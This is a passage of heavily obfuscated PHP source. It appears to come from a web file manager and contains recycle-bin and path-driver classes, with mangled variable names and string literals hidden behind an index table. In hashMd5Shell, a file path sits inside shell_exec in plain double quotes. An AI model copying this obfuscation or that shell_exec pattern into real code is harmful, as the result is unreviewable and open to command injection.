Æ–Æ©İ, $ê¯Ò®Õ¾, $æŞÔ’õ°, $Ó¼íë¼İ); } public function fileNameAutoGet($»àêöªß, $¼óÜ–ÃØ, $ê´ÁÇ½Á, $¨¾Ê¶±) { $¢–ëÌ·Î =& $_SERVER[ùÆÎÔ“Ñ]; if ($ê´ÁÇ½Á == REPEAT_REPLACE || !$»àêöªß || !in_array_not_case($¼óÜ–ÃØ, $»àêöªß) || $¨¾Ê¶± && $ê´ÁÇ½Á != REPEAT_RENAME_FOLDER) { return $¼óÜ–ÃØ; } if ($ê´ÁÇ½Á == REPEAT_SKIP) { return !1; } $öğÉÓµÕ = $¢–ëÌ·Î[10] . get_path_ext($¼óÜ–ÃØ); $öğÉÓµÕ = $öğÉÓµÕ == $¢–ëÌ·Î[10] || $¨¾Ê¶± ? $¢–ëÌ·Î[12] : $öğÉÓµÕ; for ($•‡Í«ºÆ = 1; $•‡Í«ºÆ <= count($»àêöªß) + 1; $•‡Í«ºÆ++) { $Ç–ÑØøì = substr($¼óÜ–ÃØ, 0, strlen($¼óÜ–ÃØ) - strlen($öğÉÓµÕ)); $Â«šÉ— = $Ç–ÑØøì . "\x28{$•‡Í«ºÆ}\x29{$öğÉÓµÕ}"; if (!in_array_not_case($Â«šÉ—, $»àêöªß)) { return $Â«šÉ—; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\x72\x63\145\137\x72\145\143\x79\143\154\145"; protected $dataAuto = array(array("\143\162\x65\141\164\145\124\151\155\x65", "\164\151\155\x65", "\151\156\163\145\x72\164", "\x66\x75\x6e\143\x74\x69\x6f\x6e")); public function listData($íÚ”æêÄ = false) { $¯Šú„…Ò =& $_SERVER[ùÆÎÔ“Ñ]; $íÚ”æêÄ = $íÚ”æêÄ ? $íÚ”æêÄ : USER_ID; $ş®¼Ùí„ = $this->where(array($¯Šú„…Ò[1658] => $íÚ”æêÄ))->select(); return array_to_keyvalue($ş®¼Ùí„, $¯Šú„…Ò[12], $¯Šú„…Ò[402]); } public function moveToRecycle($Œ‘ó±“¢) { $Á„¼ù =& $_SERVER[ùÆÎÔ“Ñ]; $œ×”şıÛ = Model($Á„¼ù[1341]); $ÅœÛâª­ = $œ×”şıÛ->sourceInfo($Œ‘ó±“¢); if (!$ÅœÛâª­ || $ÅœÛâª­[$Á„¼ù[431]] == $Á„¼ù[88]) { return; } $ú§²‰„¾ = array($Á„¼ù[417] => $Œ‘ó±“¢, $Á„¼ù[1658] => USER_ID, $Á„¼ù[586] => $ÅœÛâª­[$Á„¼ù[411]], $Á„¼ù[587] => $ÅœÛâª­[$Á„¼ù[505]], $Á„¼ù[590] => $ÅœÛâª­[$Á„¼ù[521]]); $this->add($ú§²‰„¾); $this->recycleMove($Œ‘ó±“¢, 1); if ($ÅœÛâª­[$Á„¼ù[410]] == $Á„¼ù[88]) { $š¹õ€¦ = array($Á„¼ù[590] => array($Á„¼ù[550], $ÅœÛâª­[$Á„¼ù[521]] . $Œ‘ó±“¢ . $Á„¼ù[551])); $œ×”şıÛ->where($š¹õ€¦)->setField($Á„¼ù[431], 1); } } public function clear() { $this->remove(!1); } public function remove($å²…‡Ò¼ = false, $ºÅÃÊà‹ = false) { $Âúâ¹ş¬ =& $_SERVER[ùÆÎÔ“Ñ]; $ºÅÃÊà‹ = $ºÅÃÊà‹ ? $ºÅÃÊà‹ : USER_ID; $³´÷¨„ş = Model($Âúâ¹ş¬[1341]); $¦åëÌäæ = $this->listData($ºÅÃÊà‹); $å²…‡Ò¼ = $å²…‡Ò¼ === !1 ? !1 : $å²…‡Ò¼; $€îêÍ†¢ = array(); foreach ($¦åëÌäæ as $³Šş•şì) { if ($å²…‡Ò¼ != !1 && !in_array($³Šş•şì, $å²…‡Ò¼)) { continue; } $¦ï˜Í = $³´÷¨„ş->sourceInfo($³Šş•şì); $³´÷¨„ş->remove($³Šş•şì, !1); $†í¸ŒÜ§ = $¦ï˜Í[$Âúâ¹ş¬[411]] . $Âúâ¹ş¬[11] . $¦ï˜Í[$Âúâ¹ş¬[505]]; $€îêÍ†¢[$†í¸ŒÜ§] = array($Âúâ¹ş¬[586] => $¦ï˜Í[$Âúâ¹ş¬[411]], $Âúâ¹ş¬[505] => $¦ï˜Í[$Âúâ¹ş¬[505]]); $this->where(array($Âúâ¹ş¬[402] => $³Šş•şì))->delete(); } foreach ($€îêÍ†¢ as $Ö©”®Š) { $³´÷¨„ş->targetSpaceUpdate($Ö©”®Š[$Âúâ¹ş¬[411]], $Ö©”®Š[$Âúâ¹ş¬[505]]); } } public function restore($í‘ã¸¨ª = false) { $ì²ü¡×à = $this->listData(); $this->_restoreSource($ì²ü¡×à, $í‘ã¸¨ª); } public function removeUserAll($­÷Ú¡è·) { $this->remove(!1, $­÷Ú¡è·); } private function _restoreSource($‘ÔäåÛÙ, $…î¢Õ‡½) { $…–öÙ½£ =& $_SERVER[ùÆÎÔ“Ñ]; $´ŒÃ†îø = Model($…–öÙ½£[1341]); $…î¢Õ‡½ = $…î¢Õ‡½ == !1 ? !1 : $…î¢Õ‡½; if (!$‘ÔäåÛÙ) { return !0; } $óšĞ€äÑ = array(); foreach ($‘ÔäåÛÙ as $íïÂ”ú’) { if ($…î¢Õ‡½ != !1 && !in_array($íïÂ”ú’, $…î¢Õ‡½)) { continue; } $İ¨‰Øæä = $´ŒÃ†îø->sourceInfo($íïÂ”ú’); $ë­Ä‹¢ñ = $´ŒÃ†îø->sourceInfo($İ¨‰Øæä[$…–öÙ½£[432]]); if ($ë­Ä‹¢ñ[$…–öÙ½£[431]] == $…–öÙ½£[88]) { continue; } $´ŒÃ†îø->lockMoveStart($íïÂ”ú’); $this->recycleMove($íïÂ”ú’, 0); if ($İ¨‰Øæä[$…–öÙ½£[410]] == $…–öÙ½£[88]) { $ºİÚİï• = array($…–öÙ½£[590] => array($…–öÙ½£[550], $İ¨‰Øæä[$…–öÙ½£[521]] . $íïÂ”ú’ . $…–öÙ½£[551])); $´ŒÃ†îø->where($ºİÚİï•)->setField($…–öÙ½£[431], 0); $this->restoreFolderChildren($íïÂ”ú’, $‘ÔäåÛÙ); } $this->where(array($…–öÙ½£[402] => $íïÂ”ú’))->delete(); $´ŒÃ†îø->folderSizeReset($İ¨‰Øæä[$…–öÙ½£[432]]); $óšĞ€äÑ[] = $İ¨‰Øæä[$…–öÙ½£[432]]; if ($İ¨‰Øæä[$…–öÙ½£[410]] == $…–öÙ½£[88]) { $óšĞ€äÑ[] = $íïÂ”ú’; } $´ŒÃ†îø->lockMoveEnd($íïÂ”ú’); } $´ŒÃ†îø->updateModifyTime($óšĞ€äÑ); } private function restoreFolderChildren($éÆäôÚı, $ğØ«Ä–Ú) { $ÎÀŸé“£ =& $_SERVER[ùÆÎÔ“Ñ]; $ Ëˆˆ£ = Model($ÎÀŸé“£[1341]); $®’¡·¿î = array($ÎÀŸé“£[402] => array($ÎÀŸé“£[7], array())); foreach ($ğØ«Ä–Ú as $¾ ½ˆø) { if ($¾ ½ˆø == $éÆäôÚı) { continue; } if (!$ Ëˆˆ£->isParentOf($éÆäôÚı, $¾ ½ˆø)) { continue; } $âëÎ¡ĞŠ = $ Ëˆˆ£->sourceInfo($¾ ½ˆø); if ($âëÎ¡ĞŠ[$ÎÀŸé“£[410]] == $ÎÀŸé“£[88]) { $®’¡·¿î[] = array($ÎÀŸé“£[590] => array($ÎÀŸé“£[550], $âëÎ¡ĞŠ[$ÎÀŸé“£[521]] . $¾ ½ˆø . $ÎÀŸé“£[551])); } else { $®’¡·¿î[$ÎÀŸé“£[402]][1][] = $¾ ½ˆø; } } if (!$®’¡·¿î[$ÎÀŸé“£[402]][1]) { unset($®’¡·¿î[$ÎÀŸé“£[402]]); } if (!$®’¡·¿î) { return; } $®’¡·¿î[$ÎÀŸé“£[402]][1] = array_unique($®’¡·¿î[$ÎÀŸé“£[402]][1]); $®’¡·¿î[$ÎÀŸé“£[1005]] = $ÎÀŸé“£[1955]; $ Ëˆˆ£->where($®’¡·¿î)->setField($ÎÀŸé“£[431], 1); } private function recycleMove($»ßïª˜, $ä”×†§ = 1) { $˜ÉØ’¯ù =& $_SERVER[ùÆÎÔ“Ñ]; $ƒœÑ®èÛ = Model($˜ÉØ’¯ù[1341]); $ÁÛşš¹‡ = Model($˜ÉØ’¯ù[2166]); $à’îîˆú = array($˜ÉØ’¯ù[402] => $»ßïª˜); if ($ä”×†§) { $ƒœÑ®èÛ->where($à’îîˆú)->setField($˜ÉØ’¯ù[431], 1); $ÁÛşš¹‡->eventRecycle($»ßïª˜, $˜ÉØ’¯ù[2167]); } else { $¦ÈˆÒÕ = $ƒœÑ®èÛ->where($à’îîˆú)->find(); $Ûş˜ÌÅ“ = $¦ÈˆÒÕ[$˜ÉØ’¯ù[410]] == $˜ÉØ’¯ù[88]; $… „¿§É = $ƒœÑ®èÛ->fileNameAuto($¦ÈˆÒÕ[$˜ÉØ’¯ù[432]], $¦ÈˆÒÕ[$˜ÉØ’¯ù[32]], REPEAT_RENAME_FOLDER, $Ûş˜ÌÅ“); if ($… „¿§É != $¦ÈˆÒÕ[$˜ÉØ’¯ù[32]]) { $ƒœÑ®èÛ->rename($»ßïª˜, $… „¿§É); } $ƒœÑ®èÛ->where($à’îîˆú)->setField($˜ÉØ’¯ù[431], 0); $ÁÛşš¹‡->eventRecycle($»ßïª˜, $˜ÉØ’¯ù[2168]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\163\157\x75\x72\143\x65\x53\x65\x63\x72\x65\164\x4c\151\163\164"; public $field = array("\163\157\x75\162\x63\145\111\x44", "\164\171\x70\145\111\104", "\x63\162\x65\x61\x74\x65\125\163\x65\x72"); } goto BÉ†Çìø­Õ; AŒÙºÑŒªĞ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $«™Ôş¨Ù =& $_SERVER[ùÆÎÔ“Ñ]; $this->objectDriver = array($«™Ôş¨Ù[60], $«™Ôş¨Ù[61], $«™Ôş¨Ù[62], $«™Ôş¨Ù[63], $«™Ôş¨Ù[64], $«™Ôş¨Ù[65], $«™Ôş¨Ù[66], $«™Ôş¨Ù[67], $«™Ôş¨Ù[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ˆÁÜ©Ü) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ˆÁÜ©Ü, $_SERVER[ùÆÎÔ“Ñ][8]); } return $ˆÁÜ©Ü; } public function iconvApp($íŞß”·ƒ) { return $íŞß”·ƒ; } public function iconvSystem($¤ÄÁ–÷ï) { return $¤ÄÁ–÷ï; } public function iconvTo($ß‚º²¯Ã, $â£¦Í”‰, $Ø—¦áÒ) { $ÊúĞşêï =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ß‚º²¯Ã || !function_exists($ÊúĞşêï[69])) { return $ß‚º²¯Ã; } static $¿Ù ¥æÌ = array(); $ë×Ä‚Ş‰ = $â£¦Í”‰ . $ÊúĞşêï[70] . $Ø—¦áÒ . $ÊúĞşêï[71] . $ß‚º²¯Ã; if (isset($¿Ù ¥æÌ[$ë×Ä‚Ş‰])) { return $¿Ù ¥æÌ[$ë×Ä‚Ş‰]; } if (function_exists($ÊúĞşêï[72])) { $“€ÂµÊ‰ = @mb_convert_encoding($ß‚º²¯Ã, $Ø—¦áÒ, $â£¦Í”‰); } else { $“€ÂµÊ‰ = @iconv($â£¦Í”‰, $Ø—¦áÒ, $ß‚º²¯Ã); } $“€ÂµÊ‰ = $“€ÂµÊ‰ ? $“€ÂµÊ‰ : $ß‚º²¯Ã; if (strstr($“€ÂµÊ‰, $ÊúĞşêï[73])) { $“€ÂµÊ‰ = str_replace($ÊúĞşêï[73], $ÊúĞşêï[11], $“€ÂµÊ‰); } $¿Ù ¥æÌ[$â£¦Í”‰ . $ÊúĞşêï[70] . $Ø—¦áÒ . $ÊúĞşêï[71] . $ß‚º²¯Ã] = $“€ÂµÊ‰; $¿Ù ¥æÌ[$Ø—¦áÒ . $ÊúĞşêï[70] . $â£¦Í”‰ . $ÊúĞşêï[71] . $ß‚º²¯Ã] = $ß‚º²¯Ã; $¿Ù ¥æÌ[$Ø—¦áÒ . $ÊúĞşêï[70] . $â£¦Í”‰ . $ÊúĞşêï[71] . $“€ÂµÊ‰] = $ß‚º²¯Ã; $¿Ù ¥æÌ[$â£¦Í”‰ . $ÊúĞşêï[70] . $Ø—¦áÒ . $ÊúĞşêï[71] . $“€ÂµÊ‰] = $“€ÂµÊ‰; return $“€ÂµÊ‰; } public function getPathInner($ğñƒ”ñ) { $è“¸ÙÊ” = IO::init($ğñƒ”ñ); return $è“¸ÙÊ”->path; } public function getPathOuter($›êá¦í) { $óË»¿è =& $_SERVER[ùÆÎÔ“Ñ]; $è¸ÈÁ = strlen(trim($this->pathBase, $óË»¿è[8])); $›êá¦í = substr(trim($›êá¦í, $óË»¿è[8]), $è¸ÈÁ); return $this->pathDriver . $óË»¿è[8] . ltrim($›êá¦í, $óË»¿è[8]); } public function isParentOf($‹«¤íİ¢, $ÊÚÉşÛˆ) { $ÇáÓ³ê‡ =& $_SERVER[ùÆÎÔ“Ñ]; $‹«¤íİ¢ = rtrim(strtolower($‹«¤íİ¢), $ÇáÓ³ê‡[8]) . $ÇáÓ³ê‡[8]; $ÊÚÉşÛˆ = rtrim(strtolower($ÊÚÉşÛˆ), $ÇáÓ³ê‡[8]) . $ÇáÓ³ê‡[8]; $È²İóÂ = strpos($ÊÚÉşÛˆ, $‹«¤íİ¢) === 0; return $È²İóÂ; } public function getType() { $òˆûóêÒ =& $_SERVER[ùÆÎÔ“Ñ]; $´çËı±ä = str_replace($òˆûóêÒ[74], $òˆûóêÒ[12], get_class($this)); return strtolower($´çËı±ä); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($“ÙËé°, $ä‹ñïÃ) { $½ëª×º =& $_SERVER[ùÆÎÔ“Ñ]; $Ğç©Üöú = rtrim($“ÙËé°, $½ëª×º[8]) . $½ëª×º[8] . $ä‹ñïÃ; $Ôñ¯±’Ã = $this->exist($Ğç©Üöú); return $Ôñ¯±’Ã ? $Ğç©Üöú : !1; } public function setModifyTime($œœó¦‘‹, $îèŠƒÑ“ = '') { } public function renameObject($õÎò™ìè, $ÊäÁ‡Í¹) { $ô½â×ßµ = $ÊäÁ‡Í¹; $õÎò™ìè = $this->getPathOuter($õÎò™ìè); $ÊäÁ‡Í¹ = $this->pathFather($õÎò™ìè) . $ÊäÁ‡Í¹; $ÍßÇøÈ = IO::copy($õÎò™ìè, $this->pathFather($õÎò™ìè), REPEAT_RENAME_FOLDER, $ô½â×ßµ); if ($ÍßÇøÈ) { IO::remove($õÎò™ìè); } return $ÍßÇøÈ ? $ÊäÁ‡Í¹ : !1; } public function tempFile($ŒâşÑ’« = '', $ÚÓöé„ã = '') { if (!$ŒâşÑ’«) { $ŒâşÑ’« = rand_string(15); } $Êåİæè = TEMP_FILES . rand_string(15) . $_SERVER[ùÆÎÔ“Ñ][8]; @mkdir($Êåİæè, DEFAULT_PERRMISSIONS, !0); $õŞÙØ³Ä = $Êåİæè . $ŒâşÑ’«; @touch($õŞÙØ³Ä); if ($ÚÓöé„ã) { file_put_contents($õŞÙØ³Ä, $ÚÓöé„ã); } return $õŞÙØ³Ä; } public function tempFileRemve($ÑÄµ•Á•) { @unlink($ÑÄµ•Á•); @rmdir($this->pathFather($ÑÄµ•Á•)); } public function mkfile($öüû¯©õ, $´ïé‡Ø = '', $²¹’œñ = REPEAT_RENAME) { } public function mkdir($ªÙüœñ, $¯ª–…¿ = REPEAT_SKIP) { } public function delFile($Œêœèšš) { } public function delFolder($ÂÕ§ûğ–) { } public function copyFile($û¼‹ÕÎŒ, $¬îøóº›) { } public function moveFile($ëÙ‘»”, $•Šà¦„Ü) { } public function remove($â®“ƒĞî) { if ($this->isFile($â®“ƒĞî)) { return $this->delFile($â®“ƒĞî); } return $this->delFolder($â®“ƒĞî); } public function rename($íç“Œñ, $›êàĞ¡´) { } public function exist($ÃÜøÚ²) { } public function findByHash($«ŸßşĞú = '', $¶™ìŠ = '') { return !1; } public function isFile($ÜŸ ª•) { } public function isFolder($ÔÉ€¹éÌ) { } public function size($ğï‘Ôëå) { } public function info($îŠÉçºÎ) { } public function infoSimple($Ìê¡ŠÒÎ) { return $this->info($Ìê¡ŠÒÎ); } public function infoAuth($¤âüÛäÇ) { return $this->info($¤âüÛäÇ); } public function infoFull($İø¸…È®) { return $this->info($İø¸…È®); } public function infoWithChildren($÷İø˜Õ‚) { $Õ¼°îÆÙ =& $_SERVER[ùÆÎÔ“Ñ]; static $Í§§×…… = array(); if (isset($Í§§×……[$÷İø˜Õ‚])) { return $Í§§×……[$÷İø˜Õ‚]; } $ÒÖÊÆÛ = $this->info($÷İø˜Õ‚); if ($ÒÖÊÆÛ && $ÒÖÊÆÛ[$Õ¼°îÆÙ[33]] == $Õ¼°îÆÙ[75]) { $ı¢¶ãéş = array($Õ¼°îÆÙ[76] => 0, $Õ¼°îÆÙ[77] => 0, $Õ¼°îÆÙ[78] => 0); $this->infoChildren($÷İø˜Õ‚, $ı¢¶ãéş); $ÒÖÊÆÛ[$Õ¼°îÆÙ[76]] = $ı¢¶ãéş[$Õ¼°îÆÙ[76]]; $ÒÖÊÆÛ[$Õ¼°îÆÙ[79]] = array($Õ¼°îÆÙ[80] => $ı¢¶ãéş[$Õ¼°îÆÙ[77]], $Õ¼°îÆÙ[81] => $ı¢¶ãéş[$Õ¼°îÆÙ[78]]); $Í§§×……[$÷İø˜Õ‚] = $ÒÖÊÆÛ; } return $ÒÖÊÆÛ; } public function listPath($Ğ·Ä†™Í, $ñº¢Šø = false) { } public function has($ä•€¨§œ, $Áåîê¡ = false, $‚»ÃŠ¹¬ = false) { } public function canRead($àÁ’°µ) { } public function canWrite($ÔéŠÄÉ†) { } public function getContent($ä¤Ç‘”§) { } public function setContent($™å§å™¢, $ÇÕô­¦… = '') { } protected function infoChildren($áœ„áé„, &$üô°œÌ‚) { $ƒüóíÍê =& $_SERVER[ùÆÎÔ“Ñ]; check_abort_echo(); $Ş†´ÁÁ = $this->listPath($áœ„áé„, !0); $Ş†´ÁÁ = array_merge($Ş†´ÁÁ[$ƒüóíÍê[82]], $Ş†´ÁÁ[$ƒüóíÍê[83]]); foreach ($Ş†´ÁÁ as $Ûº… ¥Å) { if ($Ûº… ¥Å[$ƒüóíÍê[33]] == $ƒüóíÍê[75]) { $üô°œÌ‚[$ƒüóíÍê[78]]++; $áâ¨»¬ = $this->getPathInner($Ûº… ¥Å[$ƒüóíÍê[84]]); $this->infoChildren($áâ¨»¬, $üô°œÌ‚); } else { $üô°œÌ‚[$ƒüóíÍê[77]]++; $üô°œÌ‚[$ƒüóíÍê[76]] += $Ûº… ¥Å[$ƒüóíÍê[76]]; } } } public function fileSubstr($‡äÔ¨, $ÑÙÍà€Î, $Æ“ìÛŸ¢) { } public function listAll($Ì÷ÛŒ£) { } public function listAllMake($œ³Ü¤•€, &$İß©ÀõÌ) { $ì¡Ÿ˜šú =& $_SERVER[ùÆÎÔ“Ñ]; check_abort_echo(); $µŠ— Ô = $this->listPath($œ³Ü¤•€, !0); if (!$µŠ— Ô) { return; } $”è½Îó = array_merge($µŠ— Ô[$ì¡Ÿ˜šú[82]], $µŠ— Ô[$ì¡Ÿ˜šú[83]]); foreach ($”è½Îó as $µòú½) { $§¨€ø€É = $µòú½[$ì¡Ÿ˜šú[33]] == $ì¡Ÿ˜šú[75]; $İ”êö°« = array($ì¡Ÿ˜šú[84] => $µòú½[$ì¡Ÿ˜šú[84]], $ì¡Ÿ˜šú[75] => $§¨€ø€É); if (isset($µòú½[$ì¡Ÿ˜šú[76]])) { $İ”êö°«[$ì¡Ÿ˜šú[76]] = $µòú½[$ì¡Ÿ˜šú[76]]; } if (isset($µòú½[$ì¡Ÿ˜šú[85]])) { $İ”êö°«[$ì¡Ÿ˜šú[85]] = $µòú½[$ì¡Ÿ˜šú[85]]; } if (!$§¨€ø€É) { $İß©ÀõÌ[] = $İ”êö°«; continue; } $İß©ÀõÌ[] = $İ”êö°«; $Œ­³Èë• = $µòú½[$ì¡Ÿ˜šú[84]]; $Â›‹ƒ– = $this->pathDriver; if (substr($µòú½[$ì¡Ÿ˜šú[84]], 0, strlen($Â›‹ƒ–)) == $Â›‹ƒ–) { $Œ­³Èë• = substr($Œ­³Èë•, strlen($Â›‹ƒ–)); } $this->listAllMake($Œ­³Èë•, $İß©ÀõÌ); } } public function listAllSimple($ì¥Ñ‰…ß) { $Î·²šÇï =& $_SERVER[ùÆÎÔ“Ñ]; $Ú“å§óØ = array(); $õú‹Š¶² = $this->listAll($ì¥Ñ‰…ß); $“¤¿ÚÈë = $this->getPathOuter($ì¥Ñ‰…ß); foreach ($õú‹Š¶² as $ß§¡±Ê) { $êô¨Ûè± = $ß§¡±Ê[$Î·²šÇï[84]]; $ÊµÜËÔË = $ß§¡±Ê[$Î·²šÇï[84]]; if (isset($ß§¡±Ê[$Î·²šÇï[86]])) { $êô¨Ûè± = $ß§¡±Ê[$Î·²šÇï[86]][$Î·²šÇï[84]]; $ß§¡±Ê[$Î·²šÇï[76]] = $ß§¡±Ê[$Î·²šÇï[86]][$Î·²šÇï[76]]; $ß§¡±Ê[$Î·²šÇï[85]] = $ß§¡±Ê[$Î·²šÇï[86]][$Î·²šÇï[85]]; } else { $ÊµÜËÔË = substr($ß§¡±Ê[$Î·²šÇï[84]], strlen(get_path_father($“¤¿ÚÈë))); $ÊµÜËÔË = $Î·²šÇï[8] . ltrim($ÊµÜËÔË, $Î·²šÇï[8]); } $ñŒËÕªœ = array($Î·²šÇï[84] => $ÊµÜËÔË, $Î·²šÇï[75] => $ß§¡±Ê[$Î·²šÇï[75]]); if (isset($ß§¡±Ê[$Î·²šÇï[76]]) && !$ß§¡±Ê[$Î·²šÇï[75]]) { $ñŒËÕªœ[$Î·²šÇï[76]] = $ß§¡±Ê[$Î·²šÇï[76]]; } if (isset($ß§¡±Ê[$Î·²šÇï[85]])) { $ñŒËÕªœ[$Î·²šÇï[85]] = $ß§¡±Ê[$Î·²šÇï[85]]; } if (!$ß§¡±Ê[$Î·²šÇï[75]]) { $ñŒËÕªœ[$Î·²šÇï[87]] = $êô¨Ûè±; } $Ú“å§óØ[] = $ñŒËÕªœ; } return $Ú“å§óØ; } public function upload($Ñ»¿±úŒ, $…Ÿş–ä¨, $é›¹¯Ìë = false, $é°•¿³ = REPEAT_REPLACE) { } public function uploadFileByID($¸Ì¬Ñ‰, $Ïğµ¸»Ì, $«ĞÃŸù½) { } public function uploadFileByPath($ı‰¿÷ÇÒ, $Ã½ÑÊÒÀ, $®ƒ¯À = array()) { } public function isUploadServer() { $»øçÚĞú =& $_SERVER[ùÆÎÔ“Ñ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $»øçÚĞú[88]) { return !0; } return $GLOBALS[$»øçÚĞú[6]][$»øçÚĞú[89]][$»øçÚĞú[90]]; } public function isFileOutServer() { $ç‡èğª­ =& $_SERVER[ùÆÎÔ“Ñ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ç‡èğª­[88]) { return !0; } return $GLOBALS[$ç‡èğª­[6]][$ç‡èğª­[89]][$ç‡èğª­[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($óãêğÚù) { $üÂéÕÚÙ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->isCdnHost()) { return $óãêğÚù; } return str_replace(trim(get_url_root($óãêğÚù), $üÂéÕÚÙ[8]), trim($this->cdnHost, $üÂéÕÚÙ[8]), $óãêğÚù); } public function uploadLink($ü†’ŒÂî, $¦ÇÅÜŠİ = 0) { $®®‹é¼ı =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->isUploadServer()) { return; } $éäí¨œÙ = $this->getType(); if (!in_array($éäí¨œÙ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $œË•¼Â = 1024 * 1024 * 10; $±Í“‘ü† = $¦ÇÅÜŠİ <= $œË•¼Â ? $®®‹é¼ı[92] : $®®‹é¼ı[93]; $ÛƒïßÔ = (!$¦ÇÅÜŠİ ? 1 : ceil($¦ÇÅÜŠİ / pow(1024, 3))) * 3600 * 4; $Œ»ñ¸Íç = $this->{$±Í“‘ü†}($ü†’ŒÂî, $ÛƒïßÔ); if ($Œ»ñ¸Íç) { $Œ»ñ¸Íç[$®®‹é¼ı[94]] = $ü†’ŒÂî; $Œ»ñ¸Íç[$®®‹é¼ı[95]] = $éäí¨œÙ; } return $Œ»ñ¸Íç; } public function uploadFormData($à·¦˜Æ¤, $‰´›Şˆë = 3600) { } public function multiUploadFormData($…›âéû«, $±ÇÊÚ…Æ = 3600) { } public function download($Õˆ÷Ø¿¨, $é®Û¦…) { } public function ext($ƒÛ‚™í‹) { $ÎâëÀ¶Ş =& $_SERVER[ùÆÎÔ“Ñ]; if (strpos($ƒÛ‚™í‹, $ÎâëÀ¶Ş[8]) === -1) { $¥¥ºÏ± = $ƒÛ‚™í‹; } else { $¥¥ºÏ± = $this->pathThis($ƒÛ‚™í‹); } $Ëõ‹€ğ = $ÎâëÀ¶Ş[12]; if (strstr($¥¥ºÏ±, $ÎâëÀ¶Ş[10])) { $Ëõ‹€ğ = substr($¥¥ºÏ±, strrpos($¥¥ºÏ±, $ÎâëÀ¶Ş[10]) + 1); $Ëõ‹€ğ = strtolower($Ëõ‹€ğ); } if (strlen($Ëõ‹€ğ) > 3 && preg_match($ÎâëÀ¶Ş[96], $Ëõ‹€ğ, $ï‚ìî)) { $Ëõ‹€ğ = $ÎâëÀ¶Ş[12]; } return $Ëõ‹€ğ; } public function pathThis($³Å¥†ÍÚ) { $‡Ş¬Ÿ„ =& $_SERVER[ùÆÎÔ“Ñ]; $³Å¥†ÍÚ = str_replace($‡Ş¬Ÿ„[97], $‡Ş¬Ÿ„[8], rtrim($³Å¥†ÍÚ, $‡Ş¬Ÿ„[8])); $€  áıè = strrpos($³Å¥†ÍÚ, $‡Ş¬Ÿ„[8]); if ($€  áıè === !1) { return $³Å¥†ÍÚ; } return substr($³Å¥†ÍÚ, $€  áıè + 1); } public function pathFather($äšüúü•) { $ııîšÅ =& $_SERVER[ùÆÎÔ“Ñ]; $äšüúü• = str_replace($ııîšÅ[97], $ııîšÅ[8], rtrim($äšüúü•, $ııîšÅ[8])); $ÚöáŠ¾Œ = strrpos($äšüúü•, $ııîšÅ[8]); if ($ÚöáŠ¾Œ === !1) { return $ııîšÅ[12]; } return substr($äšüúü•, 0, $ÚöáŠ¾Œ + 1); } public function hashSimple($¨ô„ÏÈ›) { $†í¯†³ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$¨ô„ÏÈ›) { return md5($†í¯†³[12]); } $İ¨¹´“Î = $this->size($¨ô„ÏÈ›); $ˆ®ø­’ = 200; $ÈŞú¼¡„ = 50; if ($İ¨¹´“Î <= $ˆ®ø­’ * $ÈŞú¼¡„) { return $this->hashMd5($¨ô„ÏÈ›) . $İ¨¹´“Î; } $ÏÎ½ ı˜ = intval($İ¨¹´“Î / $ÈŞú¼¡„); $Ø¤ÚùÀí = $†í¯†³[12]; for ($ŞÆ½˜¸ = 0; $ŞÆ½˜¸ < $ÈŞú¼¡„; $ŞÆ½˜¸++) { $Ø¤ÚùÀí .= $this->fileSubstr($¨ô„ÏÈ›, $ÏÎ½ ı˜ * $ŞÆ½˜¸, $ˆ®ø­’); } $Ø¤ÚùÀí .= $this->fileSubstr($¨ô„ÏÈ›, $İ¨¹´“Î - $ˆ®ø­’, $ˆ®ø­’); return md5($Ø¤ÚùÀí) . $İ¨¹´“Î; } public static $md5Cache = array(); public function hashMd5($Û‹—ÉÁ¸) { if (!$Û‹—ÉÁ¸) { return md5($_SERVER[ùÆÎÔ“Ñ][12]); } $Û‹—ÉÁ¸ = $this->iconvSystem($Û‹—ÉÁ¸); if (isset(self::$md5Cache[$Û‹—ÉÁ¸])) { return self::$md5Cache[$Û‹—ÉÁ¸]; } self::$md5Cache[$Û‹—ÉÁ¸] = $this->hashMd5Shell($Û‹—ÉÁ¸); if (!self::$md5Cache[$Û‹—ÉÁ¸]) { self::$md5Cache[$Û‹—ÉÁ¸] = @md5_file($Û‹—ÉÁ¸); } return self::$md5Cache[$Û‹—ÉÁ¸]; } private function hashMd5Shell($¾«ı‘Ìè) { $ŞŸ½çš =& $_SERVER[ùÆÎÔ“Ñ]; if (!$¾«ı‘Ìè) { return md5($ŞŸ½çš[12]); } if (!function_exists($ŞŸ½çš[98])) { return !1; } $ŒÉıæÖ… = array($ŞŸ½çš[99], $ŞŸ½çš[100]); $£¡‰Ò = Cache::get($ŞŸ½çš[101]); if (!$£¡‰Ò) { $­âøèØµ = BASIC_PATH . $ŞŸ½çš[102]; $™¶èÂ‘ı = md5_file($­âøèØµ); $£¡‰Ò = $ŞŸ½çš[103]; foreach ($ŒÉıæÖ… as $íÁ´ƒèç) { $ŒªÉë•† = shell_exec($íÁ´ƒèç . "\x20\x22{$­âøèØµ}\x22"); if ($ŒªÉë•† && substr(trim($ŒªÉë•†), 0, 32) == $™¶èÂ‘ı) { $£¡‰Ò = $íÁ´ƒèç; break; } } Cache::set($ŞŸ½çš[101], $£¡‰Ò, 3600); } if ($£¡‰Ò == $ŞŸ½çš[103]) { return !1; } $ŒªÉë•† = shell_exec($£¡‰Ò . "\x20\42{$¾«ı‘Ìè}\42"); $ŒªÉë•† = str_replace($ŞŸ½çš[104], $ŞŸ½çš[12], $ŒªÉë•†); return substr($ŒªÉë•†, 0, 32); } public function 